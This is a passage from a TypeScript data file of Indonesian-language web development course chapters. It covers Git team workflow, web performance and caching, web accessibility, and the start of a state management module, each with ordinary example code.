    explainAlong: "needs: lint-and-test membuat job deploy menunggu job test selesai. if: github.ref memastikan deploy hanya dari branch main.",

    aiPrompt: "Setup GitHub Actions untuk proyek-mu: lint → test → build. Tambahkan step untuk upload artifact dan notification.",

    reflection: "CI/CD yang cepat = feedback loop yang cepat. Target: pipeline selesai dalam < 5 menit untuk unit + integration test.",

  },

  {

    id: "21.5",

    moduleId: 21,

    chapterNum: "21.5",

    title: "Team Workflow dan Best Practices",

    subtitle: "Kolaborasi efektif dalam tim development",

    level: "Menengah-Lanjut",

    objectives: [

      "Mengerti semantic versioning",

      "Bisa menggunakan Git tags dan releases",

      "Mengerti team collaboration best practices",

    ],

    analogy: { diagram: "Team Workflow:\n├── Semantic Versioning (MAJOR.MINOR.PATCH)\n├── Git Tags & Releases\n├── Conventional Commits\n└── Documentation culture", caption: "Kolaborasi yang efektif membutuhkan convention, dokumentasi, dan komunikasi yang jelas" },

    explanation: "Bekerja dalam tim tidak hanya tentang coding — ini tentang komunikasi, convention, dan budaya kolaborasi.\n\nChapter ini menutup modul Git dengan best practices untuk bekerja dalam tim.\\n\\n**Semantic Versioning (SemVer)**\\nFormat versi: MAJOR.MINOR.PATCH\\n\\n- **MAJOR**: Breaking changes (incompatible API changes)\\n- **MINOR**: New features (backward compatible)\\n- **PATCH**: Bug fixes (backward compatible)\\n\\nContoh: v2.1.3 → MAJOR=2, MINOR=1, PATCH=3\\n\\nKenapa SemVer penting?\n\nDeveloper lain yang menggunakan library-mu bisa tahu apakah upgrade aman atau perlu perubahan kode.\\n\\n**Git Tags dan Releases**\\nTag menandai commit tertentu sebagai versi:\\n\\n    git tag -a v1.0.0 -m \\\"Release version 1.0.0\\\"\\n    git push origin v1.0.0\\n    # atau push semua tags:\\n    git push origin --tags\\n\\nGitHub otomatis membuat Release dari tag — bisa attach binary, changelog,\n\nDan notes.\\n\\n**Conventional Commits**\\nFormat commit message yang standar:\\n\\n    <type>(<scope>): <description>\\n    \\n    [optional body]\\n    \\n    [optional footer]\\n\\nTipe commit:\\n- **feat**: Fitur baru\\n- **fix**: Bug fix\\n- **docs**: Dokumentasi\\n- **style**: Formatting (tidak mempengaruhi kode)\\n- **refactor**: Refactor kode\\n- **test**: Menambah test\\n- **chore**: Maintenance\\n\\nContoh:\\n\\n    feat(auth): add JWT token refresh mechanism\\n    \\n    - Implement refresh token rotation\\n    - Add token expiry check middleware\\n    - Update login response to include refresh token\\n    \\n    Closes #234\\n\\n**Team Collaboration Best Practices**\\n\\n1.\n\n**Communication**:\\n   - Over-communicate daripada under-communicate\\n   - Update status secara regular\\n   - Tanya kalau tidak yakin — jangan asumsi\\n\\n2.\n\n**Code Ownership**:\\n   - CODEOWNERS file untuk assign reviewer otomatis\\n   - Tidak ada 'my code' — semua code adalah team code\\n\\n3. **Documentation**:\\n   - README dengan setup instructions\\n   - Architecture Decision Records (ADR)\\n   - API documentation\\n\\n4. **Meetings**:\\n   - Daily standup: apa yang dikerjakan, blockers\\n   - Sprint planning: commit untuk sprint\\n   - Retrospective: apa yang berjalan baik, apa yang perlu diperbaiki\\n\\n5. **Onboarding**:\\n   - Dokumentasi setup environment\\n   - Pair programming untuk minggu pertama\\n   - Checklist onboarding\\n\\n**Conflict Resolution**\\nGit conflict tidak bisa dihindari dalam tim.\n\nStrategi:\\n1. Pull sebelum push — selalu\\n2. Rebase branch secara regular\\n3. Komunikasi kalau mengerjakan file yang sama\\n4.\n\nResolve conflict segera — jangan biarkan menumpuk",

    codeExample: { language: "bash", code: "# Semantic Versioning in practice\n# Current version: v1.2.3\n\n# Bug fix → v1.2.4\ngit commit -m \"fix(api): handle null response from external service\"\ngit tag -a v1.2.4 -m \"Patch: fix null pointer exception\"\n\n# New feature → v1.3.0\ngit commit -m \"feat(dashboard): add monthly revenue chart\"\ngit commit -m \"feat(dashboard): export chart to PNG\"\ngit tag -a v1.3.0 -m \"Minor: add dashboard charts and export\"\n\n# Breaking change → v2.0.0\ngit commit -m \"feat(api)!: remove deprecated v1 endpoints\n\nBREAKING CHANGE: /api/v1/users removed. Use /api/v2/users instead.\"\ngit tag -a v2.0.0 -m \"Major: API v2 with breaking changes\"\n\n# GitHub CODEOWNERS example\n# .github/CODEOWNERS\n/src/auth/     @security-lead\n/src/api/      @backend-team\n/src/ui/       @frontend-team\n*.config.ts    @devops-lead\n/docs/         @tech-writer" },

    explainAlong: "BREAKING CHANGE: footer flag untuk commit yang merusak backward compatibility. CODEOWNERS memastikan PR ke area tertentu direview oleh expert yang sesuai.",

    aiPrompt: "Implementasikan Conventional Commits di proyek-mu. Buat changelog otomatis dari commit history menggunakan tool seperti 'git-cliff' atau 'semantic-release'.",

    reflection: "Tim yang bagus bukan tim yang tidak pernah punya konflik — tapi tim yang tahu cara resolve konflik dengan konstruktif.",

  },

];



// MODUL 22: WEB PERFORMANCE (4 chapters)

// ============================================================



const modul22: Chapter[] = [

  {

    id: "22.1",

    moduleId: 22,

    chapterNum: "22.1",

    title: "Web Performance: Kenapa Kecepatan Matters",

    subtitle: "Pengukuran performa web dan dampaknya terhadap UX dan bisnis",

    level: "Menengah",

    objectives: [

      "Memahami metrik Core Web Vitals",

      "Bisa menggunakan Lighthouse dan DevTools",

      "Mengerti dampak performa terhadap UX",

    ],

    analogy: { diagram: "Core Web Vitals:\n├── LCP < 2.5s (Loading)\n├── INP < 200ms (Interactivity)\n└── CLS < 0.1 (Visual Stability)", caption: "Core Web Vitals adalah 3 metrik utama Google untuk mengukur pengalaman pengguna di web" },

    explanation: "Pernah buka website yang loading-nya lama? Atau tombol yang tiba-tiba pindah saat mau diklik? Di era ini, kecepatan website bukan luxury — itu expectation.\\n\\n**Kenapa Kecepatan Matters?**\\n- 53% user mobile meninggalkan website > 3 detik\\n- 1 detik delay = 7% penurunan conversion (Amazon)\\n- Google pakai Core Web Vitals sebagai ranking factor sejak 2021\\n\\n**LCP — Largest Contentful Paint**: Waktu elemen terbesar terlihat di viewport. Good: < 2.5s.\\n\\n**INP — Interaction to Next Paint**: Responsivitas saat interaksi.\n\nGood: < 200ms.\\n\\n**CLS — Cumulative Layout Shift**: Seberapa banyak elemen berpindah. Good: < 0.1.\\n\\n**Lighthouse**: Tool built-in Chrome DevTools untuk audit performa. Score 0-100 untuk Performance, Accessibility, Best Practices, SEO.",

    codeExample: { language: "javascript", code: "// Mengukur Core Web Vitals\nnew PerformanceObserver((list) => {\n  const entries = list.getEntries();\n  console.log('LCP:', entries[entries.length-1].startTime);\n}).observe({entryTypes: ['largest-contentful-paint']});\n\nlet cls = 0;\nnew PerformanceObserver((list) => {\n  for (const e of list.getEntries()) {\n    if (!e.hadRecentInput) cls += e.value;\n  }\n  console.log('CLS:', cls);\n}).observe({entryTypes: ['layout-shift']});\n\n// Library web-vitals dari Google\nimport {getLCP, getINP, getCLS} from 'web-vitals';\ngetLCP(console.log); getINP(console.log); getCLS(console.log);" },

    explainAlong: "PerformanceObserver API untuk real-time tracking. Library web-vitals menyederhanakan pengukuran.",

    aiPrompt: "Ukur Core Web Vitals website favoritmu dengan Lighthouse. Identifikasi bottleneck terbesar.",

    reflection: "Website-mu sendiri berapa score Lighthouse-nya? Kalau < 90, ada room for improvement.",

  },

  {

    id: "22.2",

    moduleId: 22,

    chapterNum: "22.2",

    title: "Optimasi Loading: Code Splitting dan Lazy Loading",

    subtitle: "Kirim hanya kode yang dibutuhkan dan muat resource secara strategis",

    level: "Menengah",

    objectives: [

      "Bisa implementasi code splitting dengan React.lazy",

      "Mengerti dynamic import",

      "Bisa mengoptimasi images dan assets",

    ],

    analogy: { diagram: "Loading Strategy:\n├── Code Splitting -> per-route chunks\n├── Lazy Loading -> muat saat dibutuhkan\n├── Image Optimization -> WebP, responsive\n└── Preloading -> hint browser", caption: "Jangan kirim 1MB JS untuk halaman yang cuma butuh 100KB — split dan lazy load" },

    explanation: "Bayangkan restoran yang menyajikan semua hidangan sekaligus — sebagian dingin sebelum disentuh. Website juga: jangan load semua sekaligus.\n\n**Code Splitting dengan React.lazy**: Pisahkan bundle berdasarkan route dengan React.lazy dan Suspense. Setiap halaman punya chunk sendiri.\n\n**Image Optimization**: Images adalah penyumbang payload terbesar. Optimasi 50-80% dengan format modern (WebP, AVIF), responsive images (srcset + sizes), dan lazy loading.\n\n**Preloading**: Hint browser untuk resource kritis seperti fonts dan hero images.",

    codeExample: { language: "tsx", code: "// Route-based code splitting\nconst Home = lazy(() => import('./pages/Home'));\nconst Dashboard = lazy(() => import('./pages/Dashboard'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<Spinner />}>\n      <Routes>\n        <Route path=\"/\" element={<Home />} />\n        <Route path=\"/dashboard\" element={<Dashboard />} />\n      </Routes>\n    </Suspense>\n  );\n}\n\n// Optimized image\n<img src=\"/photo.webp\" loading=\"lazy\" decoding=\"async\"\n  srcSet=\"/photo-400.webp 400w, /photo-800.webp 800w\"\n  sizes=\"(max-width: 600px) 400px, 800px\" />" },

    explainAlong: "React.lazy + dynamic import = split point. Suspense untuk fallback UI saat loading chunk.",

    aiPrompt: "Implementasikan route-based code splitting. Analisis bundle dengan rollup-plugin-visualizer.",

    reflection: "Setiap route tanpa code splitting menambah initial bundle. Pantau bundle size setiap kali tambah dependency.",

  },

  {

    id: "22.3",

    moduleId: 22,

    chapterNum: "22.3",

    title: "Optimasi Runtime: Rendering dan JavaScript",

    subtitle: "Optimasi execution JavaScript dan rendering pipeline browser",

    level: "Menengah-Lanjut",

    objectives: [

      "Mengerti browser rendering pipeline",

      "Bisa mengoptimasi JavaScript execution",

      "Mengerti memoization dan virtualization",

    ],

    analogy: { diagram: "Rendering Pipeline:\nJavaScript -> Style -> Layout -> Paint -> Composite\n\nOptimasi:\n├── Memoization (React.memo, useMemo)\n├── Virtualization (react-window)\n├── Debounce/Throttle event handlers\n└── Web Workers untuk heavy computation", caption: "Browser rendering pipeline adalah proses mengubah kode menjadi pixel di layar — optimasi di setiap stage penting" },

    explanation: "Setelah halaman diload, performa runtime menjadi krusial. INP (Interaction to Next Paint) mengukur seberapa cepat browser merespons interaksi user.\\n\\n**Browser Rendering Pipeline**: JavaScript -> Style -> Layout -> Paint -> Composite. Reflow (Layout) adalah operasi paling mahal. Hindari layout thrashing — membaca dan menulis properti layout secara bergantian.\\n\\n**React.memo**: Cegah re-render komponen kalau props tidak berubah.\n\n**useMemo**: Cache hasil komputasi yang mahal. **useCallback**: Cache function reference untuk child components.\\n\\n**Virtualization**: Hanya render item yang terlihat di viewport. Untuk list dengan 10.000 item, render 20 item saja.",

    codeExample: { language: "tsx", code: "// React.memo untuk mencegah re-render tidak perlu\nconst UserCard = React.memo(function UserCard({ user, onSelect }) {\n  return (\n    <div onClick={() => onSelect(user.id)}>\n      <img src={user.avatar} alt={user.name} />\n      <h3>{user.name}</h3>\n    </div>\n  );\n});\n\n// useMemo untuk komputasi mahal\nconst filteredUsers = useMemo(() => {\n  return users.filter(u => u.name.toLowerCase().includes(query.toLowerCase()));\n}, [users, query]);\n\n// Virtualization dengan react-window\nimport { FixedSizeList } from 'react-window';\n<FixedSizeList height={500} itemCount={10000} itemSize={50}>\n  {({ index, style }) => (\n    <div style={style}>User #{index}: {users[index].name}</div>\n  )}\n</FixedSizeList>" },

    explainAlong: "React.memo shallow compare props. useMemo cache hasil komputasi. Virtualization hanya render item yang terlihat.",

    aiPrompt: "Profile aplikasi React-mu dengan React DevTools Profiler. Identifikasi komponen yang re-render terlalu sering.",

    reflection: "Premature optimization is the root of all evil — tapi Core Web Vitals bukan premature, itu adalah requirement.",

  },

  {

    id: "22.4",

    moduleId: 22,

    chapterNum: "22.4",

    title: "Caching Strategi dan Service Workers",

    subtitle: "Tingkatkan performa dengan caching pintar dan offline support",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa mengkonfigurasi HTTP caching headers",

      "Mengerti Service Worker dan Workbox",

      "Bisa membuat PWA dengan offline support",

    ],

    analogy: { diagram: "Caching Hierarchy:\n├── Browser Cache (HTTP headers)\n├── Service Worker (Programmable cache)\n├── CDN Cache (Edge servers)\n└── Application Cache (in-memory, localStorage)", caption: "Caching adalah cara paling efektif untuk meningkatkan performa — kirim data dari cache, bukan dari server" },

    explanation: "Caching adalah tentang trade-off: freshness vs speed.\n\nKamu bisa load data dalam 0ms dari cache, tapi datanya mungkin sudah tidak up-to-date.\\n\\n**HTTP Caching Headers**: Cache-Control: max-age=3600 (cache 1 jam), no-cache (revalidate sebelum pakai), no-store (jangan cache).\n\nETag untuk conditional request.\\n\\n**Service Worker**: Script yang berjalan di background,\n\nBisa intercept network requests dan cache responses — memungkinkan offline access.\\n\\n**Workbox**: Library Google untuk membuat Service Worker dengan mudah.\\n\\n**Caching Strategies**: Cache First untuk static assets, Network First untuk data real-time, Stale While Revalidate untuk best of both worlds.",

    codeExample: { language: "typescript", code: "// Service Worker dengan Workbox\nimport {precacheAndRoute} from 'workbox-precaching';\nimport {registerRoute} from 'workbox-routing';\nimport {StaleWhileRevalidate, CacheFirst} from 'workbox-strategies';\n\nprecacheAndRoute(self.__WB_MANIFEST);\n\n// API calls: stale while revalidate\nregisterRoute(\n  ({url}) => url.pathname.startsWith('/api/'),\n  new StaleWhileRevalidate({\n    cacheName: 'api-cache',\n    plugins: [{maxEntries: 100, maxAgeSeconds: 86400}],\n  })\n);\n\n// Images: cache first\nregisterRoute(\n  ({request}) => request.destination === 'image',\n  new CacheFirst({\n    cacheName: 'image-cache',\n    plugins: [{maxEntries: 50, maxAgeSeconds: 604800}],\n  })\n);" },

    explainAlong: "precacheAndRoute untuk static assets dari build. StaleWhileRevalidate = return cache sambil update di background.",

    aiPrompt: "Tambahkan Service Worker ke aplikasi-mu dengan Workbox. Ukur performa improvement dengan Lighthouse.",

    reflection: "PWA dengan offline support adalah competitive advantage — user tetap bisa akses konten tanpa internet.",

  },

];



// ============================================================

// MODUL 23: ACCESSIBILITY (4 chapters)

// ============================================================



const modul23: Chapter[] = [

  {

    id: "23.1",

    moduleId: 23,

    chapterNum: "23.1",

    title: "Aksesibilitas Web: Web untuk Semua Orang",

    subtitle: "Prinsip aksesibilitas dan dampaknya terhadap user experience",

    level: "Menengah",

    objectives: [

      "Memahami WCAG guidelines dan level A/AA/AAA",

      "Mengerti 4 prinsip POUR",

      "Bisa menilai aksesibilitas halaman",

    ],

    analogy: { diagram: "POUR Principles:\n├── Perceivable -> Konten bisa dipersepsikan\n├── Operable -> Interface bisa dioperasikan\n├── Understandable -> Informasi bisa dipahami\n└── Robust -> Kompatibel dengan assistive tech", caption: "Aksesibilitas bukan optional — 15% populasi dunia memiliki disability, dan a11y meningkatkan UX untuk semua" },

    explanation: "Bayangkan kamu tidak bisa melihat layar. Atau tidak bisa menggunakan mouse. Atau tidak bisa mendengar video. Bagaimana kamu menggunakan website?\n\nAksesibilitas web (a11y) adalah praktik membuat website usable oleh semua orang — termasuk yang memiliki disabilities.\\n\\n**Kenapa Aksesibilitas Penting?**\\n1. **Inklusi**: 15% populasi dunia (~1 miliar orang) memiliki disability\\n2. **Legal**: WCAG compliance adalah requirement legal di banyak negara\\n3. **SEO**: Semantic HTML yang baik untuk a11y juga bagus untuk SEO\\n4.\n\n**UX**: Aksesibilitas meningkatkan pengalaman untuk SEMUA user\\n\\n**4 Prinsip POUR (WCAG)**:\\n**Perceivable**: Konten harus bisa dipersepsikan. **Operable**: Interface harus bisa dioperasikan. **Understandable**: Konten dan operasi harus bisa dipahami. **Robust**: Konten harus kompatibel dengan teknologi assistif.\\n\\n**WCAG Levels**: A (Minimum), AA (Recommended — target untuk kebanyakan website), AAA (Enhanced).",

    codeExample: { language: "html", code: "<!-- Semantic HTML yang accessible -->\n<header>\n  <nav aria-label=\"Main navigation\">\n    <ul>\n      <li><a href=\"/\" aria-current=\"page\">Home</a></li>\n      <li><a href=\"/about\">About</a></li>\n    </ul>\n  </nav>\n</header>\n\n<main>\n  <h1>Page Title</h1>\n  <section aria-labelledby=\"features-heading\">\n    <h2 id=\"features-heading\">Features</h2>\n  </section>\n</main>\n\n<!-- Image dengan alt text deskriptif -->\n<img src=\"chart.png\" alt=\"Bar chart showing 50% increase in sales Q1 to Q2 2024\" />\n\n<!-- Form dengan proper labels -->\n<form>\n  <label for=\"email\">Email Address</label>\n  <input type=\"email\" id=\"email\" required aria-required=\"true\" />\n  <span role=\"alert\" id=\"email-error\"></span>\n</form>" },

    explainAlong: "Semantic HTML membantu screen reader. aria-label dan aria-labelledby memberikan konteks. Alt text yang deskriptif.",

    aiPrompt: "Audit website-mu dengan axe DevTools. Perbaiki semua violations yang ditemukan.",

    reflection: "Aksesibilitas bukan checkbox — itu adalah mindset. Setiap keputusan UI design harus mempertimbangkan user dengan berbagai kemampuan.",

  },

  {

    id: "23.2",

    moduleId: 23,

    chapterNum: "23.2",

    title: "Keyboard Navigation dan Focus Management",

    subtitle: "Pastikan semua interaksi bisa dilakukan tanpa mouse",

    level: "Menengah",

    objectives: [

      "Bisa membuat UI fully keyboard accessible",

      "Mengerti focus order dan focus trap",

      "Mengerti skip links dan landmarks",

    ],

    analogy: { diagram: "Keyboard Flow:\nTab -> Navigate between elements\nEnter/Space -> Activate\nArrow keys -> Navigate within component\nEscape -> Close/Dismiss", caption: "Keyboard accessibility adalah fondasi aksesibilitas — screen reader user dan power user mengandalkan keyboard" },

    explanation: "Semua interaksi yang bisa dilakukan dengan mouse HARUS bisa dilakukan dengan keyboard. Ini adalah requirement WCAG Level A.\n\n**Focus Order**: Tab order harus mengikuti visual order (top-to-bottom, left-to-right). Hindari tabindex positif — gunakan tabindex=\"0\" untuk elemen custom yang perlu focusable, atau tabindex=\"-1\" untuk programmatic focus.\n\n**Visible Focus Indicator**: Setiap elemen yang focused harus punya visible indicator (outline). Jangan hapus outline tanpa menggantinya dengan alternatif yang jelas.\n\n**Focus Trap**: Di dalam modal/dialog, focus harus terjebak — tidak bisa keluar sampai modal ditutup. Radix UI dan shadcn/ui sudah handle ini otomatis.\n\n**Skip Link**: Link tersembunyi yang memungkinkan screen reader user melewati navigation menu ke konten utama.",

    codeExample: { language: "tsx", code: "// Skip link component\nfunction SkipLink() {\n  return (\n    <a href=\"#main-content\"\n      className=\"sr-only focus:not-sr-only focus:absolute focus:top-4 focus:left-4 focus:z-50 focus:bg-white focus:px-4 focus:py-2 focus:rounded focus:shadow-lg\">\n      Skip to main content\n    </a>\n  );\n}\n\n// Keyboard-accessible dropdown\nfunction Dropdown({ items }) {\n  const [open, setOpen] = useState(false);\n  const [activeIndex, setActiveIndex] = useState(0);\n  const btnRef = useRef(null);\n  \n  const handleKeyDown = (e) => {\n    if (!open) return;\n    if (e.key === 'ArrowDown') {\n      e.preventDefault();\n      setActiveIndex(i => Math.min(i + 1, items.length - 1));\n    } else if (e.key === 'ArrowUp') {\n      e.preventDefault();\n      setActiveIndex(i => Math.max(i - 1, 0));\n    } else if (e.key === 'Escape') {\n      setOpen(false);\n      btnRef.current?.focus();\n    }\n  };\n  \n  return (\n    <div onKeyDown={handleKeyDown}>\n      <button ref={btnRef} onClick={() => setOpen(!open)} aria-expanded={open}>\n        Options\n      </button>\n      {open && (\n        <ul role=\"listbox\">\n          {items.map((item, i) => (\n            <li key={item.id} role=\"option\" aria-selected={i === activeIndex}>\n              {item.label}\n            </li>\n          ))}\n        </ul>\n      )}\n    </div>\n  );\n}" },

    explainAlong: "sr-only class menyembunyikan visual tapi tetap accessible untuk screen reader. Arrow keys untuk navigate, Escape untuk close dan return focus.",

    aiPrompt: "Coba navigasi website-mu hanya dengan keyboard (Tab, Shift+Tab, Enter, Space, Escape). Apakah semua fitur bisa diakses?",

    reflection: "Test dengan screen reader (NVDA gratis untuk Windows, VoiceOver built-in macOS). Dengarkan bagaimana website-mu terdengar.",

  },

  {

    id: "23.3",

    moduleId: 23,

    chapterNum: "23.3",

    title: "ARIA, Screen Readers, dan Testing Aksesibilitas",

    subtitle: "Tingkatkan aksesibilitas dengan ARIA dan automated testing",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa menggunakan ARIA attributes dengan benar",

      "Mengerti screen reader behavior",

      "Bisa setup automated a11y testing",

    ],

    analogy: { diagram: "ARIA Rules:\n1. Don't use ARIA if native HTML sufficient\n2. Don't change native semantics\n3. All interactive ARIA controls must be keyboard accessible\n4. Don't hide focusable elements\n5. Give accessible names to interactive elements", caption: "ARIA adalah powerful tool — tapi dangerous kalau salah digunakan. First rule of ARIA: don't use ARIA" },

    explanation: "ARIA (Accessible Rich Internet Applications) adalah set of attributes yang menambahkan semantic information ke elemen HTML.\n\nTapi ARIA bukan silver bullet — first rule of ARIA adalah: jangan gunakan ARIA kalau native HTML sudah cukup.\\n\\n**ARIA yang Sering Digunakan**: Roles (button, navigation, alert), States (aria-expanded, aria-selected, aria-checked), Properties (aria-label, aria-labelledby,\n\nAria-describedby).\\n\\n**Automated A11y Testing**: axe-core (library untuk test a11y programmatically), axe DevTools (browser extension), @testing-library/jest-dom (custom matchers).\\n\\n**Screen Reader Testing**: NVDA (gratis, Windows), JAWS (paid, Windows), VoiceOver (built-in macOS), TalkBack (built-in Android).",

    codeExample: { language: "tsx", code: "// Accessible modal dengan Radix Dialog\nimport * as Dialog from '@radix-ui/react-dialog';\n\n<Dialog.Root>\n  <Dialog.Trigger asChild>\n    <Button>Open Modal</Button>\n  </Dialog.Trigger>\n  <Dialog.Portal>\n    <Dialog.Overlay className=\"fixed inset-0 bg-black/50\" />\n    <Dialog.Content className=\"fixed center bg-white p-6 rounded\">\n      <Dialog.Title className=\"text-lg font-bold\">Confirm Delete</Dialog.Title>\n      <Dialog.Description className=\"text-gray-600\">\n        This action cannot be undone.\n      </Dialog.Description>\n      <div className=\"flex gap-2 mt-4\">\n        <Dialog.Close asChild>\n          <Button variant=\"secondary\">Cancel</Button>\n        </Dialog.Close>\n        <Button variant=\"destructive\">Delete</Button>\n      </div>\n    </Dialog.Content>\n  </Dialog.Portal>\n</Dialog.Root>\n\n// Axe-core test\nimport { axe } from 'jest-axe';\nimport { render } from '@testing-library/react';\n\nit('should have no accessibility violations', async () => {\n  const { container } = render(<MyComponent />);\n  const results = await axe(container);\n  expect(results).toHaveNoViolations();\n});" },

    explainAlong: "Radix Dialog sudah include focus trap, ESC to close, return focus, dan ARIA attributes. axe-core untuk automated a11y testing di CI/CD.",

    aiPrompt: "Integrasikan axe-core testing ke test suite-mu. Jalankan di CI/CD untuk memastikan tidak ada a11y regression.",

    reflection: "ARIA adalah last resort — prioritas gunakan semantic HTML. Tapi untuk complex components (modal, tabs, accordion), ARIA adalah necessity.",

  },

  {

    id: "23.4",

    moduleId: 23,

    chapterNum: "23.4",

    title: "Aksesibilitas di Design System dan Komponen",

    subtitle: "Build accessible components dari awal dan dokumentasikan",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa membuat accessible design system",

      "Mengerti inclusive design principles",

      "Bisa mendokumentasikan a11y komponen",

    ],

    analogy: { diagram: "Inclusive Design:\n├── Color contrast (WCAG AA: 4.5:1 for text)\n├── Font size and readability\n├── Touch target size (min 44x44px)\n├── Animation respect (prefers-reduced-motion)\n└── Responsive design for zoom up to 400%", caption: "Aksesibilitas harus menjadi bagian dari design system, bukan afterthought" },

    explanation: "Setelah menguasai teknik aksesibilitas individual, saatnya memikirkan aksesibilitas di level sistem — design system yang accessible secara default.\n\n**Color Contrast**: Rasio kontras antara teks dan background harus memenuhi WCAG: Normal text AA: 4.5:1, Large text AA: 3:1. Gunakan tool seperti WebAIM Contrast Checker.\n\n**Touch Target Size**: Target touch minimum 44x44px (Apple) atau 48x48px (Material Design).\n\n**prefers-reduced-motion**: Hormati preferensi user yang tidak ingin animasi dengan media query.\n\n**Responsive Zoom**: Website harus tetap functional saat di-zoom hingga 400%. Gunakan relative units (rem, em).\n\n**Dokumentasi A11y**: Setiap komponen harus dokumentasikan keyboard interaction, ARIA attributes, expected screen reader announcement, dan color contrast ratio.",

    codeExample: { language: "css", code: "/* Accessible design system tokens */\n:root {\n  --text-sm: 0.875rem;\n  --text-base: 1rem;\n  --text-lg: 1.125rem;\n  --color-text-primary: #1a1a2e;   /* on white: 15.3:1 */\n  --color-text-secondary: #4a5568; /* on white: 7.5:1 */\n}\n\n/* Respect motion preference */\n@media (prefers-reduced-motion: reduce) {\n  *, *::before, *::after {\n    animation-duration: 0.01ms !important;\n    animation-iteration-count: 1 !important;\n    transition-duration: 0.01ms !important;\n  }\n}\n\n/* Focus visible (only show focus on keyboard) */\n:focus:not(:focus-visible) { outline: none; }\n:focus-visible {\n  outline: 2px solid var(--color-primary);\n  outline-offset: 2px;\n}\n\n/* Minimum touch target */\n.touch-target { min-width: 48px; min-height: 48px; }" },

    explainAlong: "rem untuk font sizes agar scalable dengan browser zoom. prefers-reduced-motion menghormati user preference. :focus-visible hanya menampilkan focus indicator untuk keyboard.",

    aiPrompt: "Audit design system-mu: cek semua color combinations untuk contrast ratio. Pastikan semua interactive elements memenuhi minimum touch target.",

    reflection: "Inclusive design bukan tentang separate experience — itu adalah design yang works for everyone, dengan atau tanpa assistive technology.",

  },

];



// ============================================================

// MODUL 24: STATE MANAGEMENT MODERN (4 chapters)

// ============================================================



const modul24: Chapter[] = [

  {

    id: "24.1",

    moduleId: 24,

    chapterNum: "24.1",

    title: "Server State vs Client State: Memahami Perbedaan",

    subtitle: "Bedakan jenis state dan pilih tool yang tepat untuk masing-masing",

    level: "Menengah",

    objectives: [

      "Memahami perbedaan server state dan client state",

      "Bisa memilih tool yang tepat",

      "Mengerti caching strategy untuk server state",

    ],

    analogy: { diagram: "State Types:\n├── Server State -> Async, remote, cacheable -> TanStack Query\n├── Client State -> Sync, local, reactive -> Zustand/Jotai\n├── URL State -> Shareable, bookmarkable -> React Router\n└── Form State -> Temporary, validated -> React Hook Form", caption: "Tidak semua state sama — server state butuh caching dan synchronization, client state butuh reactivity" },

    explanation: "Salah satu keputusan arsitektur paling penting di frontend adalah: bagaimana mengelola state? Tapi sebelum memilih tool, kamu harus memahami bahwa tidak semua state itu sama. Ada 4 jenis state yang berbeda, dan masing-masing butuh pendekatan berbeda.\\n\\n**Server State**: Data yang berasal dari server — async, remote, cacheable, normalized. Contoh: user profile, product list.\\n\\n**Client State**: Data yang hanya ada di browser — sync, local, reactive.\n\nContoh: theme (dark/light), sidebar open/close.\\n\\n**URL State**: State yang tercermin di URL — shareable, bookmarkable. Contoh: search query, page number, filter aktif.\\n\\n**Form State**: State sementara saat user mengisi form — temporary, validated. Contoh: input text, validation error.\\n\\n**Rule of Thumb**: Server State -> TanStack Query/SWR. Client Global State -> Zustand/Jotai.\n\nURL State -> React Router search params. Form State -> React Hook Form. Local Component State -> useState/useReducer.",

    codeExample: { language: "tsx", code: "// ❌ Jangan: simpan server state di global store\nconst useStore = create((set) => ({\n  users: [],\n  fetchUsers: async () => {\n    const res = await fetch('/api/users');\n    set({ users: await res.json() }); // No caching!\n  },\n}));\n\n// ✅ Do: gunakan TanStack Query untuk server state\nimport { useQuery } from '@tanstack/react-query';\nfunction useUsers() {\n  return useQuery({\n    queryKey: ['users'],\n    queryFn: async () => { const res = await fetch('/api/users'); return res.json(); },\n    staleTime: 1000 * 60 * 5,\n  });\n}\n\n// ✅ Do: gunakan Zustand untuk client state\nconst useThemeStore = create((set) => ({\n  theme: 'light',\n  toggle: () => set((s) => ({ theme: s.theme === 'light' ? 'dark' : 'light' })),\n}));" },

    explainAlong: "TanStack Query handle caching, deduping, background refetch, dan garbage collection. Zustand hanya untuk state yang benar-benar client-side.",

    aiPrompt: "Audit state management di aplikasimu. Klasifikasikan setiap state: server, client, URL, atau form. Apakah kamu menggunakan tool yang tepat?",

    reflection: "Most state is server state — tapi kebanyakan developer default ke Redux untuk semuanya. Itu adalah over-engineering.",

  },

  {

    id: "24.2",

    moduleId: 24,

    chapterNum: "24.2",

    title: "TanStack Query: Server State Management",

    subtitle: "Kelola data server dengan caching, synchronization, dan background updates",

    level: "Menengah",

    objectives: [

      "Bisa setup dan menggunakan TanStack Query",

      "Menguasai caching, invalidation, dan background refetch",

      "Mengerti mutations dan optimistic updates",

    ],

    analogy: { diagram: "TanStack Query:\n├── useQuery -> Read server data\n├── useMutation -> Write server data\n├── QueryClient -> Cache management\n└── DevTools -> Debug cache state", caption: "TanStack Query adalah library paling populer untuk server state — menggantikan boilerplate Redux untuk data fetching" },

    explanation: "TanStack Query (dulu React Query) adalah library untuk mengelola server state.\n\nBukan state management library tradisional — lebih seperti caching layer untuk API calls.\\n\\n**Kenapa TanStack Query?** Tanpa TanStack Query,\n\nKamu harus menulis boilerplate berulang: loading state manual, error handling manual, cache logic manual, refetch logic manual.\n\nDengan TanStack Query, semua ini di-handle otomatis.\\n\\n**Konsep Kunci: Query Key**: Identifier unik untuk setiap query.\n\nDigunakan untuk caching dan invalidation.\n\nSimple key untuk static queries, dynamic key dengan parameter.\\n\\n**Stale While Revalidate**: Default behavior — pertama kali fetch dan tampilkan loading, data muncul dan mark as 'stale',\n\nComponent remount tampilkan cached data sambil refetch di background, window refocus trigger refetch.\\n\\n**Mutations**: Untuk operasi write (POST, PUT, DELETE).\n\nGunakan onSuccess untuk invalidateQueries setelah mutation berhasil.\\n\\n**Optimistic Updates**: Update UI sebelum server confirm — untuk UX yang lebih responsif.",

